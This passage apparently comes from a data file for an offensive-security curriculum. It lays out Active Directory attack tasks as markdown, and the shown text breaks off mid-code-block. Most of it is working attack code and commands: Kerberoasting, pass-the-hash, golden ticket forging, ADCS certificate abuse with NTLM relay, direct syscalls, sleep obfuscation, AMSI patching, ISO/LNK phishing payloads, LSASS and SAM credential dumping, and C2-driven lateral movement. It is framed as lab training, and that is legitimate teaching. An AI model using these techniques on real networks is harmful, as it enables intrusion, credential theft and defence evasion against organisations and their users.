            searchFilter='(&(objectClass=user)(servicePrincipalName=*))',
            attributes=['sAMAccountName', 'servicePrincipalName'])

        spn_users = []
        for entry in results:
            if entry['type'] == 'searchResEntry':
                user = str(entry['attributes']['sAMAccountName'])
                spns = entry['attributes']['servicePrincipalName']
                if not isinstance(spns, list):
                    spns = [spns]
                spn_users.append({'user': user, 'spns': [str(s) for s in spns]})

        return spn_users

    def request_tgs(self, spn, tgt, cipher, session_key):
        """Request TGS for specific SPN."""
        principal = Principal(spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value)

        tgs, cipher, old_key, session_key = getKerberosTGS(
            principal, self.domain, self.dc_ip,
            tgt, cipher, session_key)

        return tgs, cipher

    def tgs_to_hashcat(self, tgs, spn, username):
        """Convert TGS to hashcat format."""
        enc = tgs['ticket']['enc-part']
        etype = enc['etype']
        cipher = enc['cipher'].hex()

        if etype == 23:  # RC4
            return f"\\$krb5tgs\\$23\\$*{username}\${{self.domain}}*\${{spn}}*\${{cipher[:32]}}\${{cipher[32:]}}"
        elif etype == 18:  # AES256
            return f"\\$krb5tgs\\$18\${{username}}\${{self.domain}}\${{spn}}*\${{cipher}}"

        return None

    def roast(self):
        """Execute Kerberoasting."""
        print(f"[*] Getting TGT for {self.username}")
        tgt, cipher, session_key = self.get_tgt()

        print("[*] Finding SPN users")
        spn_users = self.find_spn_users()
        print(f"[+] Found {len(spn_users)} users with SPNs")

        hashes = []
        for user in spn_users:
            spn = user['spns'][0]
            print(f"[*] Requesting TGS for {user['user']} ({spn})")

            try:
                tgs, tgs_cipher = self.request_tgs(spn, tgt, cipher, session_key)
                hash_str = self.tgs_to_hashcat(tgs, spn, user['user'])
                if hash_str:
                    hashes.append(hash_str)
                    print(f"[+] Got hash for {user['user']}")
            except Exception as e:
                print(f"[-] Failed: {e}")

        return hashes

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('--dc', required=True)
    parser.add_argument('-o', '--output', default='hashes.txt')
    args = parser.parse_args()

    roaster = Kerberoaster(args.domain, args.dc, args.username, args.password)
    hashes = roaster.roast()

    with open(args.output, 'w') as f:
        f.write('\\n'.join(hashes))

    print(f"\\n[+] Wrote {len(hashes)} hashes to {args.output}")
    print("[*] Crack with: hashcat -m 13100 hashes.txt wordlist.txt")
\`\`\`

### Cracking
\`\`\`bash
# RC4 (etype 23)
hashcat -m 13100 hashes.txt rockyou.txt

# AES256 (etype 18)
hashcat -m 19700 hashes.txt rockyou.txt

# With rules
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
\`\`\``
				},
				{
					title: 'Perform Pass-the-Hash Without Mimikatz',
					description: 'Implement PTH using only impacket',
					details: `## Pass-the-Hash Attack

### What is PTH?
Use NTLM hash directly for authentication without knowing password.

### Using Impacket

\`\`\`python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection

# PTH with SMB
def pth_smb(target, username, nthash, domain=''):
    """Connect to SMB using hash."""
    conn = SMBConnection(target, target)
    conn.login(username, '', domain, lmhash='', nthash=nthash)

    print(f"[+] Authenticated to {target}")

    # List shares
    shares = conn.listShares()
    print("[*] Shares:")
    for share in shares:
        print(f"    {share['shi1_netname']}")

    return conn

# PTH with WMI for command execution
def pth_wmi_exec(target, username, nthash, domain, command):
    """Execute command via WMI using PTH."""
    dcom = DCOMConnection(
        target,
        username,
        '',  # No password
        domain,
        lmhash='',
        nthash=nthash
    )

    iInterface = dcom.CoCreateInstanceEx(
        "49B2791A-B1AE-4C90-9B8E-E860BA07F889",  # WMI
        "000001A0-0000-0000-C000-000000000046")   # IUnknown

    # Execute command
    # ... WMI method calls

# PTH with PSExec style
def pth_psexec(target, username, nthash, domain, command):
    """Execute command PSExec-style using PTH."""
    from impacket.examples.psexec import PSEXEC

    executer = PSEXEC(
        command,
        None,   # Path
        None,   # Protocols
        username,
        '',     # Password
        domain,
        '',     # LM hash
        nthash,
        None,   # AES key
        False,  # Do Kerberos
        None    # DC host
    )

    executer.run(target)

# Example usage
if __name__ == '__main__':
    target = '10.0.0.20'
    username = 'administrator'
    nthash = 'aad3b435b51404eeaad3b435b51404ee'  # Example hash
    domain = 'corp.local'

    # Method 1: SMB
    conn = pth_smb(target, username, nthash, domain)

    # Method 2: Command execution
    pth_psexec(target, username, nthash, domain, 'whoami')
\`\`\`

### Command Line Tools

\`\`\`bash
# SMB client
impacket-smbclient corp.local/administrator@10.0.0.20 -hashes :aad3b435b51404ee

# PSExec
impacket-psexec corp.local/administrator@10.0.0.20 -hashes :aad3b435b51404ee

# WMIExec
impacket-wmiexec corp.local/administrator@10.0.0.20 -hashes :aad3b435b51404ee

# SMBExec
impacket-smbexec corp.local/administrator@10.0.0.20 -hashes :aad3b435b51404ee

# ATExec
impacket-atexec corp.local/administrator@10.0.0.20 -hashes :aad3b435b51404ee 'whoami'
\`\`\`

### When to Use Which
| Method | Stealth | Speed | Requires |
|--------|---------|-------|----------|
| WMIExec | High | Fast | WMI access |
| PSExec | Low | Medium | Admin share + SCM |
| SMBExec | Medium | Medium | Admin share |
| ATExec | Medium | Slow | Task Scheduler |`
				},
				{
					title: 'Forge a Golden Ticket',
					description: 'Create TGT from krbtgt hash for domain dominance',
					details: `## Golden Ticket Attack

### Prerequisites
- krbtgt NTLM hash (from DCSync)
- Domain SID

### Get krbtgt Hash (DCSync)

\`\`\`bash
# Using impacket
impacket-secretsdump corp.local/administrator@dc01 -hashes :hash

# Or with Mimikatz
lsadump::dcsync /user:krbtgt
\`\`\`

### Create Golden Ticket with Impacket

\`\`\`python
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5 import constants
from impacket.krb5.asn1 import EncTicketPart, EncryptedData
from impacket.krb5.crypto import Key, _enctype_table
from pyasn1.codec.der import encoder, decoder
import datetime

def create_golden_ticket(
    username,
    domain,
    domain_sid,
    krbtgt_hash,
    user_id=500,
    groups=[513, 512, 520, 518, 519]  # Domain Admins, etc.
):
    """
    Create a Golden Ticket.

    Args:
        username: User to impersonate
        domain: Domain name
        domain_sid: Domain SID (S-1-5-21-...)
        krbtgt_hash: NTLM hash of krbtgt
        user_id: RID of user (500 = Administrator)
        groups: Group RIDs to include
    """

    # Build PAC (Privilege Attribute Certificate)
    # This contains user info and group memberships

    # Create ticket
    ticket = Ticket()
    ticket['tkt-vno'] = 5
    ticket['realm'] = domain.upper()

    # Service principal (krbtgt)
    ticket['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
    ticket['sname']['name-string'][0] = 'krbtgt'
    ticket['sname']['name-string'][1] = domain.upper()

    # Encrypted part
    enc_ticket = EncTicketPart()
    enc_ticket['flags'] = constants.TicketFlags.forwardable.value | \\
                          constants.TicketFlags.renewable.value | \\
                          constants.TicketFlags.initial.value | \\
                          constants.TicketFlags.pre_authent.value

    # Times
    now = datetime.datetime.utcnow()
    enc_ticket['authtime'] = KerberosTime.to_asn1(now)
    enc_ticket['starttime'] = KerberosTime.to_asn1(now)
    enc_ticket['endtime'] = KerberosTime.to_asn1(now + datetime.timedelta(days=10*365))
    enc_ticket['renew-till'] = KerberosTime.to_asn1(now + datetime.timedelta(days=10*365))

    # Client principal
    enc_ticket['cname']['name-type'] = constants.PrincipalNameType.NT_PRINCIPAL.value
    enc_ticket['cname']['name-string'][0] = username

    enc_ticket['crealm'] = domain.upper()

    # Session key (random)
    session_key = b'\\x00' * 16  # Should be random

    # PAC goes in authorization-data
    # This is complex - see impacket ticketer.py for full implementation

    # Encrypt with krbtgt key
    key = Key(_enctype_table[23], bytes.fromhex(krbtgt_hash))  # RC4
    encrypted = key.encrypt(3, encoder.encode(enc_ticket), None)

    ticket['enc-part']['etype'] = 23
    ticket['enc-part']['cipher'] = encrypted

    return ticket

# Using impacket's ticketer directly is easier:
# impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local administrator
\`\`\`

### Command Line
\`\`\`bash
# Create ticket
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee \\
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \\
    -domain corp.local \\
    administrator

# Use ticket
export KRB5CCNAME=administrator.ccache

# Access DC
impacket-psexec corp.local/administrator@dc01 -k -no-pass

# DCSync with golden ticket
impacket-secretsdump corp.local/administrator@dc01 -k -no-pass
\`\`\`

### Detection
- TGT with very long lifetime
- TGT without corresponding AS-REQ
- Ticket encryption with RC4 when AES is available`
				},
				{
					title: 'Exploit ADCS Vulnerabilities',
					description: 'Attack Active Directory Certificate Services (ESC1-ESC8)',
					details: `## ADCS Exploitation

### Common Vulnerabilities

| ESC | Description | Impact |
|-----|-------------|--------|
| ESC1 | Template allows SAN, enrollee supplies subject | Domain Admin |
| ESC2 | Any Purpose EKU or no EKU | Code signing, auth |
| ESC3 | Enrollment agent + vulnerable template | Enroll as anyone |
| ESC4 | Template ACL misconfiguration | Modify template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | SAN in any request |
| ESC7 | CA ACL - ManageCA/ManageCertificates | Issue certs |
| ESC8 | HTTP enrollment + NTLM relay | Auth as DC |

### Find Vulnerable Templates

\`\`\`bash
# Using Certipy
certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10

# Check for ESC1
certipy find -vulnerable -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10
\`\`\`

### ESC1 Exploitation

\`\`\`bash
# Request cert as Domain Admin
certipy req -u user@corp.local -p 'Password123!' \\
    -ca corp-DC01-CA \\
    -template VulnerableTemplate \\
    -upn administrator@corp.local \\
    -dc-ip 10.0.0.10

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10

# You now have administrator's NTLM hash!
\`\`\`

### ESC8 - HTTP Relay Attack

\`\`\`bash
# Start relay
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \\
    -smb2support --adcs --template DomainController

# Coerce authentication from DC
# (using PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py attacker_ip dc01.corp.local

# Use obtained certificate
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
\`\`\`

### Shadow Credentials Attack

\`\`\`bash
# If you can write to msDS-KeyCredentialLink
certipy shadow auto -u attacker@corp.local -p 'Password123!' \\
    -account victim -dc-ip 10.0.0.10

# This adds a certificate credential to the target account
# You can then authenticate as that account
\`\`\`

### Python Implementation

\`\`\`python
# Simplified ESC1 request
from certipy.lib.target import Target
from certipy.commands.req import Req

target = Target.create(
    username='user',
    password='Password123!',
    domain='corp.local',
    dc_ip='10.0.0.10'
)

req = Req(target)
req.request(
    ca='corp-DC01-CA',
    template='VulnerableTemplate',
    upn='administrator@corp.local'
)
# Saves administrator.pfx
\`\`\``
				}
			]
		},
		{
			name: 'EDR Evasion',
			description: 'Learn how defenses work, then break them',
			tasks: [
				{
					title: 'Understand EDR Detection Mechanisms',
					description: 'Learn how EDR detects malicious activity',
					details: `## EDR Detection Mechanisms

### Detection Layers
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    USER MODE                                 │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   ntdll.dll │  │  AMSI.dll   │  │   ETW       │         │
│  │   (hooks)   │  │ (scripts)   │  │ (telemetry) │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                              │
│  Detection: API calls, script content, .NET, PowerShell     │
├─────────────────────────────────────────────────────────────┤
│                    KERNEL MODE                               │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │  Callbacks  │  │ Minifilters │  │ ETW Kernel  │         │
│  │(PsSetCreate)│  │(filesystem) │  │  Provider   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                              │
│  Detection: Process creation, file I/O, network, registry   │
└─────────────────────────────────────────────────────────────┘
\`\`\`

### Userland Hooks

\`\`\`
Normal API call:
  Application -> ntdll.dll -> syscall -> kernel

Hooked API call:
  Application -> ntdll.dll -> EDR DLL -> ntdll.dll -> syscall -> kernel
                              ↑
                        (inspection point)
\`\`\`

### Common Hooked Functions

| Function | Why Hooked |
|----------|------------|
| NtAllocateVirtualMemory | Shellcode injection |
| NtWriteVirtualMemory | Process injection |
| NtCreateThreadEx | Remote thread creation |
| NtOpenProcess | Process access |
| NtReadVirtualMemory | Credential dumping |
| NtProtectVirtualMemory | Making memory executable |

### ETW (Event Tracing for Windows)

\`\`\`
Providers sending telemetry:
- Microsoft-Windows-DotNETRuntime (.NET execution)
- Microsoft-Windows-PowerShell (PS commands)
- Microsoft-Windows-Threat-Intelligence (kernel events)
- Microsoft-Windows-Security-Auditing (security events)
\`\`\`

### AMSI (Antimalware Scan Interface)

\`\`\`
Scans content in:
- PowerShell scripts
- VBScript/JScript
- .NET assemblies
- Office macros
- WSH (Windows Script Host)

Before execution, content is sent to:
  AmsiScanBuffer() -> AV/EDR -> Allow/Block
\`\`\`

### Kernel Callbacks

\`\`\`c
// EDR registers callbacks for:

// Process creation/termination
PsSetCreateProcessNotifyRoutine(callback, FALSE);

// Thread creation
PsSetCreateThreadNotifyRoutine(callback);

// Image loading
PsSetLoadImageNotifyRoutine(callback);

// Registry operations
CmRegisterCallback(callback, NULL, &cookie);

// Object access (handles)
ObRegisterCallbacks(&callbackInfo, &handle);
\`\`\`

### What Gets Caught

| Action | Detection |
|--------|-----------|
| VirtualAlloc RWX | API hook + heuristic |
| CreateRemoteThread | Kernel callback + API hook |
| Mimikatz execution | Signature + AMSI + behavior |
| PowerShell download cradle | ETW + AMSI |
| Process hollowing | Kernel callback (unusual image) |
| LSASS access | Protected Process + callback |`
				},
				{
					title: 'Implement Direct Syscalls',
					description: 'Bypass userland hooks with SysWhispers/HellsGate',
					details: `## Direct Syscalls

### Why Direct Syscalls?
\`\`\`
Normal (hooked):
  Your code -> ntdll.NtAllocateVirtualMemory -> EDR hook -> syscall

Direct syscall:
  Your code -> syscall instruction (bypass ntdll entirely)
\`\`\`

### Syscall Stub Structure

\`\`\`asm
; Normal ntdll stub (x64)
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 18h        ; syscall number
    syscall
    ret
\`\`\`

### Manual Syscall Implementation

\`\`\`c
// syscalls.h
#pragma once
#include <windows.h>

// Syscall numbers (Windows 10 21H2 - these change between versions!)
#define SYSCALL_NtAllocateVirtualMemory 0x18
#define SYSCALL_NtProtectVirtualMemory  0x50
#define SYSCALL_NtWriteVirtualMemory    0x3A
#define SYSCALL_NtCreateThreadEx        0xC1

// Function prototypes
NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
\`\`\`

\`\`\`asm
; syscalls.asm (MASM)
.code

NtAllocateVirtualMemory_Syscall proc
    mov r10, rcx
    mov eax, 18h
    syscall
    ret
NtAllocateVirtualMemory_Syscall endp

NtProtectVirtualMemory_Syscall proc
    mov r10, rcx
    mov eax, 50h
    syscall
    ret
NtProtectVirtualMemory_Syscall endp

end
\`\`\`

### Hell's Gate - Dynamic Resolution

\`\`\`c
// Dynamically find syscall numbers at runtime
// Avoids hardcoding (which changes between Windows versions)

#include <windows.h>

typedef struct _SYSCALL {
    DWORD number;
    PVOID address;
} SYSCALL;

DWORD GetSyscallNumber(PVOID functionAddress) {
    // Read the syscall stub
    // Pattern: mov r10, rcx; mov eax, <number>
    // Bytes: 4C 8B D1 B8 XX XX 00 00

    BYTE* stub = (BYTE*)functionAddress;

    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }

    // Hooked - need Halo's Gate (look at neighbors)
    return 0;
}

SYSCALL GetSyscall(LPCSTR functionName) {
    SYSCALL sc = {0};

    // Get ntdll base
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    // Get function address
    sc.address = GetProcAddress(ntdll, functionName);

    // Extract syscall number
    sc.number = GetSyscallNumber(sc.address);

    return sc;
}

// Usage
int main() {
    SYSCALL ntAlloc = GetSyscall("NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory syscall: 0x%X\\n", ntAlloc.number);

    // Now use this number in your syscall stub
}
\`\`\`

### Go Implementation

\`\`\`go
package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var (
    ntdll = syscall.NewLazyDLL("ntdll.dll")
)

func getSyscallNumber(funcName string) uint16 {
    proc := ntdll.NewProc(funcName)
    addr := proc.Addr()

    // Read bytes at function start
    stub := (*[8]byte)(unsafe.Pointer(addr))

    // Check for: mov r10, rcx; mov eax, XX
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
        return *(*uint16)(unsafe.Pointer(&stub[4]))
    }

    return 0
}

func main() {
    funcs := []string{
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
    }

    for _, f := range funcs {
        num := getSyscallNumber(f)
        fmt.Printf("%s: 0x%X\\n", f, num)
    }
}
\`\`\`

### Tools
- **SysWhispers2/3**: Generate syscall stubs
- **HellsGate**: Dynamic syscall resolution
- **Halo's Gate**: Handle hooked functions`
				},
				{
					title: 'Implement Sleep Obfuscation',
					description: 'Encrypt beacon memory during sleep to avoid scanning',
					details: `## Sleep Obfuscation

### Why Sleep Obfuscation?
- EDR scans process memory periodically
- Shellcode/beacon in memory can be detected
- Encrypt during sleep, decrypt when active

### Techniques

| Technique | Description |
|-----------|-------------|
| Ekko | ROP-based sleep with encrypted memory |
| Foliage | Similar to Ekko, improved |
| DeathSleep | XOR + VirtualProtect |

### Simple XOR Sleep

\`\`\`c
#include <windows.h>

BYTE xor_key[16] = { /* random key */ };

void xor_memory(PVOID address, SIZE_T size, BYTE* key, SIZE_T key_len) {
    BYTE* ptr = (BYTE*)address;
    for (SIZE_T i = 0; i < size; i++) {
        ptr[i] ^= key[i % key_len];
    }
}

void obfuscated_sleep(PVOID beacon_addr, SIZE_T beacon_size, DWORD ms) {
    DWORD old_protect;

    // Make memory RW
    VirtualProtect(beacon_addr, beacon_size, PAGE_READWRITE, &old_protect);

    // Encrypt
    xor_memory(beacon_addr, beacon_size, xor_key, sizeof(xor_key));

    // Sleep
    Sleep(ms);

    // Decrypt
    xor_memory(beacon_addr, beacon_size, xor_key, sizeof(xor_key));

    // Restore RX
    VirtualProtect(beacon_addr, beacon_size, PAGE_EXECUTE_READ, &old_protect);
}
\`\`\`

### Ekko-style with Timers

\`\`\`c
// Uses NtContinue and timer callbacks
// More complex but stealthier

#include <windows.h>

typedef NTSTATUS(NTAPI* pNtContinue)(PCONTEXT, BOOLEAN);

// Simplified concept
void ekko_sleep(PVOID image_base, SIZE_T image_size, DWORD sleep_time) {
    CONTEXT ctx_backup;
    CONTEXT ctx_rop;

    // Capture current context
    RtlCaptureContext(&ctx_backup);

    // Set up ROP chain to:
    // 1. VirtualProtect(RW)
    // 2. SystemFunction032 (RC4 encrypt)
    // 3. WaitForSingleObject (sleep)
    // 4. SystemFunction032 (RC4 decrypt)
    // 5. VirtualProtect(RX)
    // 6. NtContinue (resume)

    // Create timer to trigger ROP chain
    // ...

    // Actual Ekko implementation is 200+ lines
    // See: https://github.com/Cracked5pider/Ekko
}
\`\`\`

### Go Implementation

\`\`\`go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "syscall"
    "time"
    "unsafe"
)

var (
    kernel32       = syscall.NewLazyDLL("kernel32.dll")
    virtualProtect = kernel32.NewProc("VirtualProtect")
)

func encryptMemory(addr uintptr, size int, key []byte) {
    // Read memory
    data := make([]byte, size)
    for i := 0; i < size; i++ {
        data[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
    }

    // AES encrypt
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    encrypted := gcm.Seal(nonce, nonce, data, nil)

    // Write back (simplified - need proper handling)
    for i := 0; i < len(encrypted) && i < size; i++ {
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = encrypted[i]
    }
}

func obfuscatedSleep(beaconAddr uintptr, beaconSize int, key []byte, duration time.Duration) {
    var oldProtect uint32

    // RW
    virtualProtect.Call(beaconAddr, uintptr(beaconSize), 0x04, uintptr(unsafe.Pointer(&oldProtect)))

    // Encrypt
    encryptMemory(beaconAddr, beaconSize, key)

    // Sleep
    time.Sleep(duration)

    // Decrypt
    // ... (reverse of encrypt)

    // RX
    virtualProtect.Call(beaconAddr, uintptr(beaconSize), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
}
\`\`\`

### Detection Evasion
- Memory is encrypted during sleep
- RWX → RW during sleep (less suspicious)
- Periodic scans find only encrypted data
- Active time is minimal`
				},
				{
					title: 'Bypass AMSI',
					description: 'Disable AMSI to execute PowerShell/C# undetected',
					details: `## AMSI Bypass Techniques

### How AMSI Works
\`\`\`
PowerShell/Script execution
         ↓
    AmsiScanBuffer()
         ↓
    AV/EDR evaluation
         ↓
    Allow or Block
\`\`\`

### Method 1: Patch AmsiScanBuffer

\`\`\`c
#include <windows.h>

BOOL PatchAmsi() {
    // Get amsi.dll
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;

    // Get AmsiScanBuffer address
    LPVOID addr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return FALSE;

    // Patch: xor eax, eax; ret (return AMSI_RESULT_CLEAN)
    // x64: 48 31 C0 C3
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };

    DWORD old;
    VirtualProtect(addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, patch, sizeof(patch));
    VirtualProtect(addr, sizeof(patch), old, &old);

    return TRUE;
}
\`\`\`

### Method 2: PowerShell Reflection

\`\`\`powershell
# Find and patch AmsiScanBuffer via reflection
$a=[Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null,[IntPtr]::Zero)
            }
        }
    }
}
\`\`\`

### Method 3: Hardware Breakpoints

\`\`\`c
// Set hardware breakpoint on AmsiScanBuffer
// When hit, modify return value

#include <windows.h>

LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS e) {
    if (e->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if we're at AmsiScanBuffer
        if (e->ContextRecord->Rip == (DWORD64)amsiScanBufferAddr) {
            // Set return value to AMSI_RESULT_CLEAN
            e->ContextRecord->Rax = 0;
            // Skip function, return immediately
            e->ContextRecord->Rip = *(DWORD64*)e->ContextRecord->Rsp;
            e->ContextRecord->Rsp += 8;
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void SetupAMSIBypass() {
    AddVectoredExceptionHandler(1, VectoredHandler);

    // Set hardware breakpoint
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = (DWORD64)GetProcAddress(
        GetModuleHandleA("amsi.dll"), "AmsiScanBuffer");
    ctx.Dr7 = 0x1; // Enable DR0

    SetThreadContext(GetCurrentThread(), &ctx);
}
\`\`\`

### Method 4: Forcing Error

\`\`\`powershell
# Force amsiInitFailed = true
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(
    'System.Management.Automation.AmsiUtils').GetField(
    'amsiInitFailed','NonPublic,Static').GetValue($null),0x41414141)
\`\`\`

### Go Implementation

\`\`\`go
package main

import (
    "syscall"
    "unsafe"
)

func patchAMSI() bool {
    amsi := syscall.NewLazyDLL("amsi.dll")
    scanBuffer := amsi.NewProc("AmsiScanBuffer")

    // Patch bytes: xor eax, eax; ret
    patch := []byte{0x48, 0x31, 0xC0, 0xC3}

    var oldProtect uint32
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    vp := kernel32.NewProc("VirtualProtect")

    vp.Call(scanBuffer.Addr(), 4, 0x40, uintptr(unsafe.Pointer(&oldProtect)))

    for i, b := range patch {
        *(*byte)(unsafe.Pointer(scanBuffer.Addr() + uintptr(i))) = b
    }

    vp.Call(scanBuffer.Addr(), 4, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

    return true
}
\`\`\``
				}
			]
		},
		{
			name: 'Full Chain Operations',
			description: 'Put everything together - compromise AD lab with custom tools only',
			tasks: [
				{
					title: 'Execute Initial Access with Custom Payload',
					description: 'Craft phishing payload and establish C2 with your tools',
					details: `## Initial Access Phase

### Payload Options

| Format | Pros | Cons |
|--------|------|------|
| ISO | Bypasses MOTW | User interaction |
| LNK | Familiar | Detected by many |
| HTA | Powerful | Requires IE |
| OneNote | New vector | Patched |
| Macro | Classic | Blocked by default |

### ISO Payload Structure
\`\`\`
payload.iso
├── document.lnk    (shortcut to loader)
├── loader.exe      (your C2 implant)
└── decoy.pdf       (legitimate looking doc)
\`\`\`

### LNK Payload

\`\`\`powershell
# Create malicious LNK
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:TEMP\\document.lnk")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c start /b loader.exe && start decoy.pdf"
$Shortcut.IconLocation = "%SystemRoot%\\System32\\shell32.dll,1"
$Shortcut.Save()
\`\`\`

### C2 Checklist
- [ ] Implant compiled with evasion features
- [ ] Server configured with valid TLS
- [ ] Malleable profile to blend traffic
- [ ] Tested against Defender

### Execution Flow
\`\`\`
1. User opens ISO (auto-mounted)
2. User clicks LNK (looks like PDF)
3. LNK executes hidden loader
4. Loader decrypts and runs implant
5. Implant beacons to C2
6. Decoy PDF opens (user sees nothing wrong)
\`\`\`

### Verify Access
\`\`\`bash
# From C2 console
> agents
ID        HOSTNAME    USER         OS              LAST SEEN
agent01   WS01        alice        Windows 11      2 min ago

> interact agent01
agent01> shell whoami
corp\\alice
\`\`\``
				},
				{
					title: 'Perform Discovery and Credential Harvesting',
					description: 'Enumerate domain and dump credentials with custom tools',
					details: `## Discovery & Credential Harvesting

### Discovery Commands
\`\`\`bash
# From your C2
agent01> shell whoami /all
agent01> shell net user /domain
agent01> shell net group "Domain Admins" /domain
agent01> shell nltest /dclist:corp.local

# Using your LDAP enumerator
agent01> upload ldap_enum.exe
agent01> shell ldap_enum.exe -d corp.local -u alice -p Password123!
\`\`\`

### BloodHound Collection
\`\`\`bash
# Upload your collector
agent01> upload bloodhound_collector.exe
agent01> shell bloodhound_collector.exe -c All

# Download results
agent01> download C:\\Users\\alice\\bloodhound.zip

# Import into BloodHound on attacker machine
\`\`\`

### Credential Harvesting

\`\`\`bash
# Using your credential dumper (needs admin)
# First, check if we have local admin anywhere

agent01> shell net localgroup administrators

# If alice is local admin:
agent01> upload cred_dumper.exe
agent01> shell cred_dumper.exe
[+] Dumping LSASS...
[+] Credentials found:
    alice:Password123!
    bob:P@ssw0rd!
    svc_sql:SQLService123!

# Or dump SAM
agent01> shell reg save HKLM\\SAM sam.save
agent01> shell reg save HKLM\\SYSTEM system.save
agent01> download sam.save
agent01> download system.save

# Parse offline
impacket-secretsdump -sam sam.save -system system.save LOCAL
\`\`\`

### Identify Attack Paths

From BloodHound:
\`\`\`
alice (current)
    → Member of "IT Support"
        → GenericAll on "bob"
            → Member of "Server Admins"
                → Local Admin on "SRV01"
                    → Session: svc_sql
                        → Kerberoastable → Domain Admin path
\`\`\``
				},
				{
					title: 'Execute Lateral Movement to Domain Controller',
					description: 'Move through the network to reach DC using your tools',
					details: `## Lateral Movement

### Attack Path Execution

\`\`\`
Step 1: alice → GenericAll → bob (reset password)
Step 2: bob credentials → RDP/WMI to SRV01
Step 3: SRV01 → dump svc_sql credentials
Step 4: Kerberoast svc_sql → crack password
Step 5: svc_sql → constrained delegation → DC
\`\`\`

### Step 1: Abuse GenericAll

\`\`\`bash
# Reset bob's password (alice has GenericAll)
agent01> shell net user bob NewPassword123! /domain

# Or use your Python script
agent01> upload ad_attack.py
agent01> shell python ad_attack.py reset-password -u bob -p NewPassword123!
\`\`\`

### Step 2: Move to SRV01

\`\`\`bash
# Using WMI with bob's credentials
agent01> shell wmic /node:SRV01 /user:corp\\bob /password:NewPassword123! process call create "powershell -enc <beacon>"

# Or use your PTH tool with bob's hash
# First get bob's hash
agent01> shell mimikatz.exe "sekurlsa::logonpasswords"
# bob NTLM: aad3b435b51404eeaad3b435b51404ee

# PTH to SRV01
./pth_exec.py SRV01 bob aad3b435b51404ee "powershell -enc <beacon>"
\`\`\`

### Step 3: Pivot and Dump svc_sql

\`\`\`bash
# Now on SRV01
agent02> shell whoami
corp\\bob

# Check for svc_sql session
agent02> shell query user
 USERNAME          SESSIONNAME   ID  STATE
 svc_sql           console        1  Active

# Dump credentials
agent02> upload cred_dumper.exe
agent02> shell cred_dumper.exe
[+] svc_sql:SQLService123!
\`\`\`

### Step 4: Kerberoast (Alternative)

\`\`\`bash
# If can't dump directly, Kerberoast
agent01> upload kerberoast.py
agent01> shell python kerberoast.py -d corp.local -u alice -p Password123!

# Crack offline
hashcat -m 13100 hash.txt rockyou.txt
# Found: svc_sql:SQLService123!
\`\`\`

### Step 5: Constrained Delegation to DC

\`\`\`bash
# svc_sql can delegate to DC
# Request TGT as svc_sql
